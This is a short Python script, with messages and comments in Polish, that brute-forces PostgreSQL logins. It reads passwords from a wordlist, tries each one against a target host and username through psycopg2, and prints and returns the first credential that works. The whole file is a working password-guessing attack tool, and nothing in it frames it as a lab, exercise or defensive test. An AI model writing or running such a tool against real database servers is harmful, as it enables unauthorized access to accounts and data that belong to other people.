import psycopg2
from psycopg2 import OperationalError

def postgres_bruteforce(host, username, wordlist_path, port=5432, dbname="postgres"):
    with open(wordlist_path, "r") as f:
        for line in f:
            password = line.strip()
            try:
                conn = psycopg2.connect(
                    host=host,
                    user=username,
                    password=password,
                    port=port,
                    dbname=dbname,
                    connect_timeout=3
                )
                print(f"[+] PostgreSQL Zalogowano: {username}:{password}")
                conn.close()
                return password
            except OperationalError:
                # Nieudana próba logowania
                continue
            except Exception as e:
                print(f"[!] Błąd: {e}")
                continue
    print("[!] Nie znaleziono poprawnego hasła.")
    return None